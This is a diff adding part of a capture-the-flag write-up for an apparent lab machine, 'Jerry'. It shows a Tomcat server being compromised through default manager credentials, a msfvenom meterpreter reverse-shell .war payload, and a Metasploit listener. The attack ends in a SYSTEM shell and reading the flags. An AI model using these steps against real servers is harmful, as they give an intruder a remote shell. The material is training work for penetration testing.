@@ -88,10 +88,84 @@
 
 // We can see its default credentials login: tomcat : s3cret
 
+// Navigate to http-get://10.10.10.95:8080/ and click on 'Server Status' and default login credentials
 
+![Image 4]()
 
+// Then click on 'List applications'
 
+![Image 5]()
 
+// Rolling down we can see that we can upload .war files
 
+![Image 7]()
 
+// Lets first make .war payload with msfvenom
 
+    $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.173 LPORT=1444 -f war -o jerry_war.war
+---------
+
+    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+    [-] No arch selected, selecting arch: x64 from the payload
+    No encoder specified, outputting raw payload
+    Payload size: 510 bytes
+    Final size of war file: 2444 bytes
+    Saved as: jerry_war.war
+
+// and lets see how the jsp file inside called
+
+    $ mkdir tmp
+
+    $ cd tmp/
+
+    $ unzip ../jerry_war.war 
+
+    Archive:  ../jerry_war.war
+       creating: META-INF/
+      inflating: META-INF/MANIFEST.MF    
+       creating: WEB-INF/
+      inflating: WEB-INF/web.xml         
+      inflating: biemviiajpvn.jsp   
+
+    $ ls
+    META-INF  WEB-INF  biemviiajpvn.jsp
+
+// The file called biemviiajpvn.jsp
+
+// So lets open a listiner on Metasploit multi/handler
+
+    msf6> use exploit/multi/handler
+
+    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+    payload => windows/x64/meterpreter/reverse_tcp
+    msf6 exploit(multi/handler) > set lport 1444
+    lport => 1444
+    msf6 exploit(multi/handler) > set lhost 10.10.16.173
+    lhost => 10.10.16.173
+
+    msf6 exploit(multi/handler) > exploit -j
+    [*] Exploit running as background job 0.
+    [*] Exploit completed, but no session was created.
+
+    [*] Started reverse TCP handler on 10.10.16.173:1444 
+
+// now opload the war file 
+
+![Image 7]()
+
+// And navigate to http://10.10.10.95:8080/jerry_war/biemviiajpvn.jspv
+
+    meterpreter > getuid
+    Server username: NT AUTHORITY\SYSTEM
+
+// We got NT/SYSTEM !!! and the flags !
+
+    meterpreter > pwd
+    C:\Users\Administrator\Desktop\flags
+
+    meterpreter > cat '2 for the price of 1.txt'
+    user.txt
+    7004dbce..................
+
+    root.txt
+    04a8b36e1.................
